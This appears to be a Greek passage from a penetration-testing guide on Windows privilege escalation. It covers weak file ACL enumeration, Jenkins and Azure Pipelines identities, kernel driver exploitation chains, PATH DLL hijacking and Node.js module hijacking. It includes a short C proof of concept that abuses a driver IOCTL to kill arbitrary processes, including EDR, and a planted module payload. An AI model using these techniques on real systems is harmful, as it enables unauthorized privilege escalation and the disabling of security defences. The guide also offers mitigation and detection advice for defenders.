Το [CVE-2022-47966](https://www.manageengine.com/security/advisory/CVE/cve-2022-47966.html) επηρέαζε την έκδοση 6210 και παλαιότερες του ADSelfService Plus· ο προμηθευτής το διόρθωσε στην έκδοση 6211. Είναι σχετικό μόνο αν το SAML SSO **είναι ή ήταν** ενεργοποιημένο. Επομένως, μια καταχώριση εγκατεστημένου προϊόντος ή μια διαδρομή υπηρεσίας αποτελεί ένδειξη προς διερεύνηση, όχι απόδειξη ευπάθειας: επιβεβαιώστε την ακριβή έκδοση, το ιστορικό ρυθμίσεων SAML, την προσβασιμότητα της υπηρεσίας μέσω δικτύου και τον λογαριασμό με τον οποίο εκτελείται. Η εκτέλεση κώδικα μέσω της υπηρεσίας κληρονομεί τα δικαιώματα αυτού του λογαριασμού· η εκτέλεση ως SYSTEM απαιτεί η διεργασία να εκτελείται ως SYSTEM. Ένα αναγνώσιμο `OfflineBackup_*.ezip` στον κατάλογο Backup του προϊόντος αποτελεί ξεχωριστή ένδειξη κρυπτογραφημένου αντιγράφου ασφαλείας, όχι απόδειξη διαθέσιμου διαπιστευτηρίου ή αυτής της αδυναμίας SAML. Καταγράψτε τη διαδρομή και τα δικαιώματα πρόσβασης χωρίς να το αποσυμπιέσετε κατά την τακτική απαρίθμηση.

#### Όρια Jenkins controller και λογαριασμών τομέα

Σε έναν Windows Jenkins controller, ξεχωρίστε το δικαίωμα δημιουργίας ή ρύθμισης μιας εργασίας από το δικαίωμα εκκίνησής της: [η Jenkins τα τεκμηριώνει ως ξεχωριστά δικαιώματα `Job/Create`, `Job/Configure` και `Job/Build`](https://www.jenkins.io/doc/book/security/access-control/permissions/). Ένα ρυθμισμένο χρονοδιάγραμμα ή ένα απομακρυσμένο trigger μπορεί να προσφέρει και άλλη διαδρομή εκτέλεσης του build, αλλά επιβεβαιώστε ότι είναι ενεργοποιημένο και ότι το build εκτελείται πράγματι. Η εκτέλεση γίνεται με την ταυτότητα του controller ή του επιλεγμένου agent, ενώ ένα αποθηκευμένο διαπιστευτήριο μπορεί να χρησιμοποιηθεί μόνο αν η εργασία έχει πρόσβαση στο πεδίο εφαρμογής του. Ξεχωριστά, ελέγξτε την πρόσβαση στα μεταδεδομένα του `JENKINS_HOME`: η Jenkins αποθηκεύει υλικό διαπιστευτηρίων και κλειδιά κρυπτογράφησης στα `credentials.xml`, `secrets/hudson.util.Secret` και `secrets/master.key` ([αποθήκευση μυστικών της Jenkins](https://www.jenkins.io/doc/developer/security/secrets/)). Η παρουσία τους από μόνη της δεν αποκαλύπτει κωδικό πρόσβασης· επαληθεύστε **δικαίωμα ανάγνωσης των απαιτούμενων αρχείων** και μια ξεχωριστή διαδρομή επαναχρησιμοποίησης λογαριασμού, χωρίς να εμφανίσετε μυστικά σε κοινόχρηστη έξοδο. Αν αυτός ο λογαριασμός έχει δικαίωμα εγγραφής στο `scriptPath` ενός αντικειμένου χρήστη AD, επιβεβαιώστε ότι η διαδρομή δέχεται εγγραφή και ότι υπάρχει πραγματική σύνδεση ή προγραμματισμένη διεργασία που τη χρησιμοποιεί και εκτελείται ως ο χρήστης-στόχος, προτού τη θεωρήσετε εκτέλεση ως άλλος χρήστης. Ο περαιτέρω έλεγχος ομάδας απαιτεί ξεχωριστή επαλήθευση των πραγματικών δικαιωμάτων AD.

#### Ταυτότητα self-hosted agent στο Azure Pipelines

Για ένα έργο Azure DevOps Server ή Azure Pipelines, ξεχωρίστε το δικαίωμα **δημιουργίας ή επεξεργασίας** ενός pipeline από το δικαίωμα **τοποθέτησής του σε ουρά** και χρήσης του επιλεγμένου agent pool· η [Microsoft τεκμηριώνει ξεχωριστά τα δικαιώματα pipeline](https://learn.microsoft.com/en-us/azure/devops/pipelines/policies/permissions?view=azure-devops) και την [εξουσιοδότηση pool](https://learn.microsoft.com/en-us/azure/devops/pipelines/agents/pools-queues?view=azure-devops). Αν ένας λογαριασμός με χαμηλότερα δικαιώματα μπορεί να υποβάλει ένα βήμα script και να εκτελέσει το pipeline σε self-hosted Windows agent, το βήμα εκτελείται ως ο [ρυθμισμένος λογαριασμός λειτουργικού συστήματος του agent](https://learn.microsoft.com/azure/devops/pipelines/agents/agents). Πριν ισχυριστείτε ότι υπάρχει μετάβαση σε άλλον χρήστη ή SYSTEM, επαληθεύστε το ακριβές pipeline, τους περιορισμούς κλάδου/πόρου, το εξουσιοδοτημένο pool, την εκτελέσιμη εργασία και την ταυτότητα της υπηρεσίας agent. Η εγκατάσταση agent, ο ρόλος έργου ή η δυνατότητα εγγραφής στο αποθετήριο αποτελούν μόνο ενδείξεις προς διερεύνηση· εξετάστε τα δικαιώματα και τα τοπικά μεταδεδομένα της υπηρεσίας χωρίς να ξεκινήσετε build κατά την παθητική απαρίθμηση.

#### Διαπιστευτήρια Microsoft Entra Connect Sync

Η [Microsoft διακρίνει](https://learn.microsoft.com/en-us/entra/identity/hybrid/connect/reference-connect-accounts-permissions) τον **λογαριασμό υπηρεσίας ADSync**, ο οποίος εκτελεί την υπηρεσία συγχρονισμού και αποκτά πρόσβαση στη βάση δεδομένων SQL, από τον **λογαριασμό σύνδεσης AD DS**, του οποίου τα δικαιώματα καταλόγου εξαρτώνται από τις ρυθμισμένες δυνατότητες συγχρονισμού. Τα διαπιστευτήρια σύνδεσης αποθηκεύονται κρυπτογραφημένα σε αυτήν τη βάση δεδομένων, ενώ το υλικό κλειδιού [προστατεύεται με DPAPI στο πλαίσιο του λογαριασμού υπηρεσίας ADSync](https://learn.microsoft.com/en-us/entra/identity/hybrid/connect/concept-adsync-service-account). Η εγκατεστημένη υπηρεσία συγχρονισμού, μια ομάδα που μοιάζει να έχει δικαιώματα τοπικού διαχειριστή ή η ορατότητα της βάσης δεδομένων από μόνα τους δεν αποδεικνύουν ότι υπάρχει αποκρυπτογραφήσιμο διαπιστευτήριο ή δυνατότητα κλιμάκωσης δικαιωμάτων στον τομέα. Εξετάστε ξεχωριστά τα πραγματικά δικαιώματα ανάγνωσης της βάσης δεδομένων, την πρόσβαση στον λογαριασμό υπηρεσίας και στα κλειδιά, τη διάταξη εγκατάστασης και SQL, την ρυθμισμένη ταυτότητα σύνδεσης και τα πραγματικά δικαιώματα AD αυτής της ταυτότητας. Η τακτική απαρίθμηση πρέπει να εμφανίζει μόνο μεταδεδομένα υπηρεσίας και πρόσβασης, όχι να αναζητά ή να εμφανίζει αποθηκευμένα μυστικά.

#### Δικαιώματα σε DLL υποστήριξης προγραμμάτων οδήγησης εκτυπωτή

Ένα εγκατεστημένο πρόγραμμα οδήγησης εκτυπωτή μπορεί να αποθηκεύει DLL υποστήριξης στο `C:\ProgramData` και να τα φορτώνει σε διεργασία εκτύπωσης με αυξημένα δικαιώματα. Ελέγξτε τα ακριβή δικαιώματα ACL του καταλόγου και των DLL, συμπεριλαμβανομένων των γονικών καταλόγων και των reparse points, ακόμη κι αν δεν επιτρέπεται η απαρίθμηση εκτυπωτών μέσω WMI. Για το [πρόβλημα προγράμματος οδήγησης εκτυπωτή Ricoh CVE-2019-19363](https://www.ricoh.com/info/2020/0122_1), η αναφερόμενη διαδρομή ήταν `C:\ProgramData\RICOH_DRV\<driver>\_common\dlz`· [η αρχική αποκάλυψη](https://www.pentagrid.ch/de/blog/local-privilege-escalation-in-ricoh-printer-drivers-for-windows-cve-2019-19363/) περιγράφει τη φόρτωση DLL από το `PrintIsolationHost.exe`. Ένα ACL που επιτρέπει εγγραφή αποτελεί μόνο ένδειξη προς διερεύνηση: επαληθεύστε την πραγματική δυνατότητα εγγραφής αφού ληφθούν υπόψη οι καταχωρίσεις άρνησης, ότι το σχετικό πρόγραμμα οδήγησης είναι εγκατεστημένο και φορτώνει το αρχείο με προνομιούχα ταυτότητα, καθώς και αν ο προμηθευτής έχει διορθώσει την εγκατάσταση μέσω ενημερωμένου προγράμματος οδήγησης ή προγράμματος ασφαλείας. Μην συμπεραίνετε ότι υπάρχει ευπάθεια μόνο από το όνομα του καταλόγου ή την έκδοση του προγράμματος οδήγησης.

### Δικαιώματα εγγραφής

Ελέγξτε αν μπορείτε να τροποποιήσετε κάποιο αρχείο ρυθμίσεων για να διαβάσετε κάποιο ειδικό αρχείο ή αν μπορείτε να τροποποιήσετε κάποιο εκτελέσιμο αρχείο που πρόκειται να εκτελεστεί από λογαριασμό Administrator (schedtasks).

Ένας τρόπος να εντοπίσετε αδύναμα δικαιώματα σε φακέλους/αρχεία του συστήματος είναι να εκτελέσετε:

```bash
accesschk.exe /accepteula
# Find all weak folder permissions per drive.
accesschk.exe -uwdqs Users c:\
accesschk.exe -uwdqs "Authenticated Users" c:\
accesschk.exe -uwdqs "Everyone" c:\
# Find all weak file permissions per drive.
accesschk.exe -uwqs Users c:\*.*
accesschk.exe -uwqs "Authenticated Users" c:\*.*
accesschk.exe -uwdqs "Everyone" c:\*.*
```

```bash
icacls "C:\Program Files\*" 2>nul | findstr "(F) (M) :\" | findstr ":\ everyone authenticated users todos %username%"
icacls ":\Program Files (x86)\*" 2>nul | findstr "(F) (M) C:\" | findstr ":\ everyone authenticated users todos %username%"
```

```bash
Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'Everyone'} } catch {}}

Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'BUILTIN\Users'} } catch {}}
```

### Αυτόματη φόρτωση plugin του Notepad++ για persistence/εκτέλεση

Το Notepad++ φορτώνει αυτόματα οποιοδήποτε DLL plugin βρίσκεται στους υποφακέλους `plugins`. Αν υπάρχει εγκατάσταση portable/αντίγραφο με δυνατότητα εγγραφής, η προσθήκη ενός κακόβουλου plugin οδηγεί σε αυτόματη εκτέλεση κώδικα μέσα στο `notepad++.exe` σε κάθε εκκίνηση (συμπεριλαμβανομένων των `DllMain` και των callbacks του plugin).

{{#ref}}
notepad-plus-plus-plugin-autoload-persistence.md
{{#endref}}

### Εκτέλεση κατά την εκκίνηση

**Ελέγξτε αν μπορείτε να αντικαταστήσετε κάποιο registry ή binary που πρόκειται να εκτελεστεί από διαφορετικό χρήστη.**\
**Διαβάστε** την **ακόλουθη σελίδα** για να μάθετε περισσότερα σχετικά με ενδιαφέρουσες **τοποθεσίες autoruns για κλιμάκωση προνομίων**:


{{#ref}}
privilege-escalation-with-autorun-binaries.md
{{#endref}}

### Drivers

Αναζητήστε πιθανούς **περίεργους/ευάλωτους drivers τρίτων**

```bash
driverquery
driverquery.exe /fo table
driverquery /SI
```

Αν ένας driver εκθέτει ένα primitive αυθαίρετης ανάγνωσης/εγγραφής στον kernel (συνηθισμένο σε κακοσχεδιασμένους IOCTL handlers), μπορείτε να κλιμακώσετε τα δικαιώματά σας κλέβοντας απευθείας ένα SYSTEM token από τη μνήμη του kernel.<sup>[[13]](#references)</sup> Δείτε εδώ την τεχνική βήμα προς βήμα:

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

{{#ref}}
windows-kernel-rootkits-and-dkom.md
{{#endref}}

Σχετικό υλικό για Windows kernel exploitation:

{{#ref}}
../../binary-exploitation/windows-kernel-type-confusion-to-npfs-arbitrary-rw.md
{{#endref}}

Για bugs race condition όπου η ευάλωτη κλήση ανοίγει μια διαδρομή Object Manager που ελέγχεται από τον attacker, η σκόπιμη επιβράδυνση της αναζήτησης (με χρήση components μέγιστου μήκους ή βαθιών αλυσίδων καταλόγων) μπορεί να παρατείνει το χρονικό παράθυρο από μικροδευτερόλεπτα σε δεκάδες μικροδευτερόλεπτα:

{{#ref}}
kernel-race-condition-object-manager-slowdown.md
{{#endref}}

{{#ref}}
../../binary-exploitation/windows-kernel-exploitation/afd-rio-buffer-uaf.md
{{#endref}}

#### UAF σε cancel-safe queues, disclosures από paged pool και pivots σε I/O ring

Ορισμένες αλυσίδες Windows kernel LPE μπορούν να βασιστούν σε δύο μεμονωμένα αδύναμα bugs: ένα **race condition στη διάρκεια ζωής cancel-safe queue** που αποδεσμεύει ένα request/CBD ενώ το lock της ουράς παραμένει κατειλημμένο, και ένα disclosure τύπου **lock-release-before-copy** που διαρρέει μια αποδεσμευμένη καταχώριση paged pool κατά τη διάρκεια του `RtlCopyToUser`.<sup>[[29]](#references)</sup>

Σημειώσεις για auditing και exploitation:

- **Free-under-lock + cancel afterwards**: αναζητήστε μια διαδρομή επιτυχίας που εκτελεί **Acquire -> CompleteRequest/free -> Release**, ενώ η διαδρομή cancel εκτελεί **Acquire -> RemoveIo(stale pointer) -> Release -> CompleteCanceledIo**. Αν η διαδρομή επιτυχίας φτάσει στα `FltCompletePendedPreOperation` / `FltpFreeIrpCtrl` πριν αποδεσμεύσει το lock CBDQ/CSQ, ένα thread που έχει μπλοκαριστεί στο `NtCancelIoFileEx -> IopCsqCancelRoutine` μπορεί αργότερα να συνεχίσει και να περάσει ένα αποδεσμευμένο `PFLT_CALLBACK_DATA` στο callback αφαίρεσης του driver.
- **Ανακτήστε το αποδεσμευμένο αντικείμενο της ουράς** με μια attacker-controlled καταχώριση paged pool ίδιου μεγέθους. Τα `NPFS` Data Queue Entries είναι χρήσιμα, επειδή το payload και το μέγεθος μπορούν να ελεγχθούν και αργότερα μπορείτε να τα εξετάσετε με λειτουργίες ανάγνωσης/peek pipe. Αν το αποδεσμευμένο αντικείμενο περιέχει list links, αντικαταστήστε τα με μια **κυκλική λίστα από fake request nodes στη μνήμη user-mode**, ώστε ο driver να επεξεργάζεται επανειλημμένα attacker-defined request structures αντί να τερματίζει στην αρχική κεφαλή της λίστας.
- **Αναβαθμίστε ένα προβλέψιμο write**: αν το fake request ανακατευθύνει έναν nested context pointer που χρησιμοποιείται από bookkeeping writes (timestamps / QPC / πεδία γειτονικά με refcount), μπορεί να αποκτήσετε ένα kernel write με **ελεγχόμενη διεύθυνση αλλά όχι ελεγχόμενη τιμή**. Σε αυτήν την περίπτωση, στοχεύστε το πεδίο **length/size** ενός αντικειμένου pool που έχετε κάνει spray, αντί για έναν τελικό code/data pointer, και στη συνέχεια εξετάστε διαδοχικά τα αντικείμενα του spray μέχρι το αλλοιωμένο αντικείμενο να επιτρέψει μια **out-of-bounds ανάγνωση paged pool**.
- **Μοτίβο disclosure που επιδέχεται race condition**: κάθε syscall που εκτελεί `ptr = obj->Buffer; unlock(obj); RtlCopyToUser(dst, ptr, size)` είναι ισχυρός υποψήφιος. Η αξιοπιστία βελτιώνεται όταν ο attacker μπορεί να αυξήσει το μέγεθος του buffer που αντιγράφεται (για παράδειγμα, προσθέτοντας πολλές εγγραφές λίστας/resource που αυξάνουν το τελικό μέγεθος κατανομής του serializer), επειδή η μεγαλύτερη διάρκεια του copy διευρύνει το παράθυρο αντικατάστασης χωρίς κατ’ ανάγκη να προκαλεί crash στο σύστημα.
- **Στόχοι refill με πολλούς pointers**: οι registered-buffer arrays του Windows **I/O ring** είναι εξαιρετικοί στόχοι disclosure, επειδή το μέγεθός τους στο paged pool ελέγχεται από τον attacker (`8 * regBufferCnt`) και κάθε στοιχείο είναι ένας kernel pointer προς ένα `_IOP_MC_BUFFER_ENTRY`. Κάντε leak έναν από αυτούς τους arrays, ανακτήστε το περιβάλλον `IORING_OBJECT` και, στη συνέχεια, αλλοιώστε τα **`RegBuffers`** και **`RegBuffersCount`**, ώστε οι επόμενες λειτουργίες I/O ring να χρησιμοποιούν attacker-forged entries και να παρέχουν αυθαίρετη ανάγνωση/εγγραφή στον kernel. Αν το μόνο διαθέσιμο write σάς δίνει μια σταθερή τιμή byte (για παράδειγμα από το `KUSER_SHARED_DATA+0x14`), χρησιμοποιήστε **επικαλυπτόμενα unaligned writes** για να δημιουργήσετε έναν επαναλαμβανόμενο user pointer όπως `0x0101010101010101`, αντιστοιχίστε τον με `VirtualAlloc` και τοποθετήστε εκεί τον forged registered-buffer array.<sup>[[30]](#references)</sup>

Χρήσιμοι δείκτες debugging:

```text
NtCancelIoFileEx -> IopCsqCancelRoutine -> <driver>!RemoveIo
<driver> success path: Acquire -> CompleteRequest/free -> Release
RtlCopyToUser after releasing the object lock
ExAllocatePool2(..., 8 * regBufferCnt, 'BRrI')-style variable-sized pointer arrays
```

Μόλις αποκτήσετε αυθαίρετη ανάγνωση/εγγραφή kernel μέσω του corrupted I/O ring, κλέψτε ένα SYSTEM token χρησιμοποιώντας την τυπική ροή εργασιών μετά την απόκτηση primitive:

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

#### Primitives αλλοίωσης μνήμης Registry hive

Οι σύγχρονες ευπάθειες hive επιτρέπουν τη δημιουργία προβλέψιμων layouts, την κατάχρηση εγγράψιμων απογόνων HKLM/HKU και τη μετατροπή της αλλοίωσης metadata σε υπερχειλίσεις kernel paged-pool χωρίς custom driver. Μάθετε όλη την αλυσίδα εδώ:

{{#ref}}
windows-registry-hive-exploitation.md
{{#endref}}

#### Σύγχυση τύπων σε direct mode του `RtlQueryRegistryValues` μέσω paths που ελέγχει ο επιτιθέμενος

Ορισμένοι drivers δέχονται ένα registry path από το userland, ελέγχουν μόνο αν είναι έγκυρη συμβολοσειρά UTF-16 και στη συνέχεια καλούν `RtlQueryRegistryValues(RTL_REGISTRY_ABSOLUTE, userPath, ...)` με `RTL_QUERY_REGISTRY_DIRECT` και προορισμό μια scalar μεταβλητή στη στοίβα, όπως `int readValue`. Αν λείπει το `RTL_QUERY_REGISTRY_TYPECHECK`, το `EntryContext` ερμηνεύεται σύμφωνα με τον **πραγματικό** τύπο registry και όχι τον τύπο που αναμένει ο developer.

Αυτό δημιουργεί δύο χρήσιμα primitives:<sup>[[24]](#references)[[25]](#references)</sup>

- **Confused deputy / oracle**: ένα απόλυτο path `\Registry\...` που ελέγχει ο χρήστης επιτρέπει στον driver να κάνει query σε keys που επιλέγει ο επιτιθέμενος, να αποκαλύπτει την ύπαρξή τους μέσω return codes/logs και, κάποιες φορές, να διαβάζει τιμές στις οποίες ο caller δεν θα είχε άμεση πρόσβαση.
- **Αλλοίωση μνήμης kernel**: ένας προορισμός scalar, όπως το `&readValue`, υπόκειται σε σύγχυση τύπων ως `REG_QWORD`, `UNICODE_STRING` ή buffer δυαδικών δεδομένων καθορισμένου μεγέθους, ανάλογα με τον τύπο της registry value.

Σημειώσεις για πρακτική εκμετάλλευση:

- **Μετριασμός στα Windows 8+**: αν το query αφορά ένα **untrusted hive** με `RTL_QUERY_REGISTRY_DIRECT`, αλλά χωρίς `RTL_QUERY_REGISTRY_TYPECHECK`, οι κλήσεις από τον kernel προκαλούν crash με `KERNEL_SECURITY_CHECK_FAILURE (0x139)`. Για να διατηρήσετε τη δυνατότητα εκμετάλλευσης, αναζητήστε **keys εγγράψιμα από τον επιτιθέμενο μέσα σε trusted system hives** αντί να τοποθετείτε τις τιμές στο `HKCU`.
- **Προετοιμασία σε trusted hive**: χρησιμοποιήστε το NtObjectManager για να απαριθμήσετε εγγράψιμους απογόνους του `\Registry\Machine` και εκτελέστε ξανά τη σάρωση με ένα duplicated token **χαμηλής ακεραιότητας**, ώστε να εντοπίσετε keys προσβάσιμα από περιβάλλοντα sandbox:<sup>[[26]](#references)</sup>

```powershell
Get-AccessibleKey \Registry\Machine -Recurse -Access SetValue
$token = Get-NtToken -Primary -Duplicate -IntegrityLevel Low
Get-AccessibleKey \Registry\Machine -Recurse -Access SetValue -Token $token
```

- **`REG_QWORD`**: μια απευθείας εγγραφή 8 byte σε ένα `int` 4 byte καταστρέφει γειτονικά δεδομένα της στοίβας και μπορεί να αντικαταστήσει εν μέρει έναν κοντινό δείκτη callback/function.
- **`REG_SZ` / `REG_EXPAND_SZ`**: το direct mode αναμένει το `EntryContext` να δείχνει σε ένα `UNICODE_STRING`. Αν ο κώδικας φορτώσει πρώτα ένα `REG_DWORD` ελεγχόμενο από τον επιτιθέμενο σε μια βαθμωτή μεταβλητή της στοίβας και έπειτα χρησιμοποιήσει ξανά το ίδιο buffer για ανάγνωση συμβολοσειράς, ο επιτιθέμενος ελέγχει τα `Length`/`MaximumLength` και επηρεάζει εν μέρει τον δείκτη `Buffer`, προκαλώντας μια μερικώς ελεγχόμενη εγγραφή στον kernel.
- **`REG_BINARY`**: για μεγάλα δυαδικά δεδομένα, το direct mode αντιμετωπίζει το πρώτο `LONG` στο `EntryContext` ως μέγεθος buffer με πρόσημο. Αν μια προηγούμενη ανάγνωση `REG_DWORD` αφήσει μια **αρνητική** τιμή ελεγχόμενη από τον επιτιθέμενο στη βαθμωτή μεταβλητή που χρησιμοποιείται ξανά, το επόμενο ερώτημα `REG_BINARY` αντιγράφει τα bytes του επιτιθέμενου απευθείας σε γειτονικές θέσεις της στοίβας, κάτι που συχνά αποτελεί την πιο καθαρή οδό για πλήρη αντικατάσταση δείκτη callback.

Ισχυρό μοτίβο για αναζήτηση: **ετερογενείς αναγνώσεις registry στην ίδια μεταβλητή της στοίβας χωρίς επαναρχικοποίησή της**. Κάντε grep για `RTL_REGISTRY_ABSOLUTE`, `RTL_QUERY_REGISTRY_DIRECT`, επαναχρησιμοποιούμενους δείκτες `EntryContext` και διαδρομές κώδικα όπου η πρώτη ανάγνωση registry καθορίζει αν θα εκτελεστεί δεύτερη ανάγνωση.

#### Κατάχρηση της απουσίας του FILE_DEVICE_SECURE_OPEN σε αντικείμενα device (LPE + EDR kill)

Ορισμένοι υπογεγραμμένοι drivers τρίτων δημιουργούν το αντικείμενο device με ισχυρό SDDL μέσω του IoCreateDeviceSecure, αλλά παραλείπουν να ορίσουν το FILE_DEVICE_SECURE_OPEN στο DeviceCharacteristics. Χωρίς αυτήν τη σημαία, το ασφαλές DACL δεν επιβάλλεται όταν γίνεται άνοιγμα του device μέσω μιας διαδρομής που περιέχει ένα επιπλέον στοιχείο, επιτρέποντας σε οποιονδήποτε μη προνομιούχο χρήστη να αποκτήσει handle χρησιμοποιώντας μια διαδρομή namespace όπως:<sup>[[14]](#references)</sup>

- \\ .\\DeviceName\\anything
- \\ .\\amsdk\\anyfile (από πραγματικό περιστατικό)

Μόλις ένας χρήστης μπορέσει να ανοίξει το device, μπορούν να χρησιμοποιηθούν καταχρηστικά τα προνομιούχα IOCTL που εκθέτει ο driver για LPE και παραποίηση. Παραδείγματα δυνατοτήτων που έχουν παρατηρηθεί στην πράξη:
- Επιστροφή handles πλήρους πρόσβασης σε αυθαίρετες διεργασίες (κλοπή token / κέλυφος SYSTEM μέσω DuplicateTokenEx/CreateProcessAsUser).
- Απεριόριστη ανάγνωση/εγγραφή raw δίσκου (παραποίηση εκτός σύνδεσης, τεχνάσματα persistence κατά την εκκίνηση).
- Τερματισμός αυθαίρετων διεργασιών, συμπεριλαμβανομένων των Protected Process/Light (PP/PPL), επιτρέποντας την εξόντωση AV/EDR από το user land μέσω του kernel.

Ελάχιστο μοτίβο PoC (user mode):
```c
// Example based on a vulnerable antimalware driver
#define IOCTL_REGISTER_PROCESS  0x80002010
#define IOCTL_TERMINATE_PROCESS 0x80002048

HANDLE h = CreateFileA("\\\\.\\amsdk\\anyfile", GENERIC_READ|GENERIC_WRITE, 0, 0, OPEN_EXISTING, 0, 0);
DWORD me = GetCurrentProcessId();
DWORD target = /* PID to kill or open */;
DeviceIoControl(h, IOCTL_REGISTER_PROCESS,  &me,     sizeof(me),     0, 0, 0, 0);
DeviceIoControl(h, IOCTL_TERMINATE_PROCESS, &target, sizeof(target), 0, 0, 0, 0);
```

Mitigations για developers
- Να ορίζετε πάντα το FILE_DEVICE_SECURE_OPEN κατά τη δημιουργία device objects που προορίζονται να περιορίζονται μέσω DACL.
- Να επικυρώνετε το context του caller για προνομιακές λειτουργίες. Προσθέστε ελέγχους PP/PPL πριν επιτρέψετε τον τερματισμό process ή την επιστροφή handles.
- Να περιορίζετε τα IOCTLs (access masks, METHOD_*, επικύρωση εισόδου) και να εξετάζετε τη χρήση μοντέλων με broker αντί για άμεσα kernel privileges.

Ιδέες ανίχνευσης για defenders
- Παρακολουθείτε ανοίγματα ύποπτων ονομάτων device από user mode (π.χ. `\\ .\\amsdk*`) και συγκεκριμένες ακολουθίες IOCTL που υποδηλώνουν κατάχρηση.
- Εφαρμόζετε τη λίστα αποκλεισμού ευάλωτων drivers της Microsoft (HVCI/WDAC/Smart App Control) και διατηρείτε τις δικές σας λίστες επιτρεπόμενων/αποκλεισμένων.


## PATH DLL Hijacking

Αν έχετε **δικαιώματα εγγραφής σε έναν φάκελο που βρίσκεται στο PATH**, ίσως μπορέσετε να κάνετε hijack ένα DLL που φορτώνεται από ένα process και να **κλιμακώσετε τα privileges**.<sup>[[2]](#references)</sup>

Ελέγξτε τα δικαιώματα όλων των φακέλων μέσα στο PATH:

```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```

Για περισσότερες πληροφορίες σχετικά με το πώς γίνεται abuse αυτού του ελέγχου:


{{#ref}}
dll-hijacking/writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

## Hijacking επίλυσης module Node.js / Electron μέσω `C:\node_modules`

Αυτή είναι μια παραλλαγή **uncontrolled search path στα Windows** που επηρεάζει εφαρμογές **Node.js** και **Electron** όταν εκτελούν ένα bare import, όπως `require("foo")`, και το αναμενόμενο module **λείπει**.<sup>[[20]](#references)</sup>

Το Node επιλύει τα πακέτα ανεβαίνοντας στη δομή καταλόγων και ελέγχοντας τους φακέλους `node_modules` σε κάθε γονικό κατάλογο. Στα Windows, αυτή η αναζήτηση μπορεί να φτάσει στη ρίζα του drive, επομένως μια εφαρμογή που ξεκινά από το `C:\Users\Administrator\project\app.js` μπορεί να καταλήξει να ελέγχει τα εξής:<sup>[[21]](#references)</sup>

1. `C:\Users\Administrator\project\node_modules\foo`
2. `C:\Users\Administrator\node_modules\foo`
3. `C:\Users\node_modules\foo`
4. `C:\node_modules\foo`

Αν ένας **χρήστης με χαμηλά προνόμια** μπορεί να δημιουργήσει το `C:\node_modules`, μπορεί να τοποθετήσει εκεί ένα κακόβουλο `foo.js` (ή έναν φάκελο πακέτου) και να περιμένει μέχρι μια **διαδικασία Node/Electron με υψηλότερα προνόμια** να επιχειρήσει να επιλύσει την εξάρτηση που λείπει. Το payload εκτελείται στο πλαίσιο ασφαλείας της διεργασίας-θύματος, επομένως αυτό οδηγεί σε **LPE** όταν ο στόχος εκτελείται ως administrator, από προγραμματισμένη εργασία με elevated privileges / service wrapper ή από προνομιούχο desktop app που ξεκινά αυτόματα.

Αυτό είναι ιδιαίτερα συνηθισμένο όταν:

- μια εξάρτηση δηλώνεται στο `optionalDependencies`<sup>[[22]](#references)</sup>
- μια βιβλιοθήκη τρίτου μέρους περικλείει το `require("foo")` σε `try/catch` και συνεχίζει σε περίπτωση αποτυχίας
- ένα πακέτο αφαιρέθηκε από τα production builds, παραλείφθηκε κατά το packaging ή απέτυχε να εγκατασταθεί
- το ευάλωτο `require()` βρίσκεται βαθιά μέσα στο δέντρο εξαρτήσεων και όχι στον κώδικα της κύριας εφαρμογής

### Εντοπισμός ευάλωτων στόχων

Χρησιμοποιήστε το **Procmon** για να επιβεβαιώσετε τη διαδρομή επίλυσης:<sup>[[23]](#references)</sup>

- Φιλτράρετε κατά `Process Name` = το εκτελέσιμο αρχείο-στόχος (`node.exe`, το EXE της εφαρμογής Electron ή η διεργασία wrapper)
- Φιλτράρετε κατά `Path` `contains` `node_modules`
- Εστιάστε στα `NAME NOT FOUND` και στο τελευταίο επιτυχές άνοιγμα κάτω από το `C:\node_modules`

Χρήσιμα μοτίβα για ανασκόπηση κώδικα σε αποσυσκευασμένα αρχεία `.asar` ή στον πηγαίο κώδικα της εφαρμογής:

```bash
rg -n 'require\\("[^./]' .
rg -n "require\\('[^./]" .
rg -n 'optionalDependencies' .
rg -n 'try[[:space:]]*\\{[[:space:][:print:]]*require\\(' .
```

### Exploitation

1. Εντοπίστε το **όνομα του πακέτου που λείπει** από το Procmon ή από την εξέταση του πηγαίου κώδικα.
2. Δημιουργήστε τον ριζικό κατάλογο αναζήτησης, αν δεν υπάρχει ήδη:

```powershell
mkdir C:\node_modules
```

3. Τοποθετήστε ένα module με το ακριβές αναμενόμενο όνομα:

```javascript
// C:\node_modules\foo.js
require("child_process").exec("calc.exe")
module.exports = {}
```

4. Ενεργοποιήστε την εφαρμογή-στόχο. Αν η εφαρμογή επιχειρήσει `require("foo")` και η νόμιμη μονάδα δεν υπάρχει, το Node μπορεί να φορτώσει το `C:\node_modules\foo.js`.

Παραδείγματα προαιρετικών μονάδων που λείπουν και ταιριάζουν σε αυτό το μοτίβο είναι τα `bluebird` και `utf-8-validate`, αλλά το **technique** είναι το επαναχρησιμοποιήσιμο στοιχείο: βρείτε οποιοδήποτε **missing bare import** θα επιλυθεί από μια προνομιούχα διεργασία Node/Electron στα Windows.

### Ιδέες για εντοπισμό και ενίσχυση της ασφάλειας

- Ειδοποιηθείτε όταν ένας χρήστης δημιουργεί το `C:\node_modules` ή γράφει εκεί νέα αρχεία/πακέτα `.js`.
- Αναζητήστε διεργασίες υψηλής ακεραιότητας που διαβάζουν από το `C:\node_modules\*`.
- Συμπεριλάβετε όλες τις εξαρτήσεις χρόνου εκτέλεσης στα πακέτα παραγωγής και ελέγξτε τη χρήση του `optionalDependencies`.
- Ελέγξτε τον κώδικα τρίτων για μοτίβα `try { require("...") } catch {}` που δεν εμφανίζουν σφάλμα.
- Απενεργοποιήστε τους προαιρετικούς ελέγχους, αν το υποστηρίζει η βιβλιοθήκη (για παράδειγμα, ορισμένες εγκαταστάσεις του `ws` μπορούν να παραλείψουν τον παλιό έλεγχο για `utf-8-validate` με `WS_NO_UTF_8_VALIDATE=1`).

## Δίκτυο

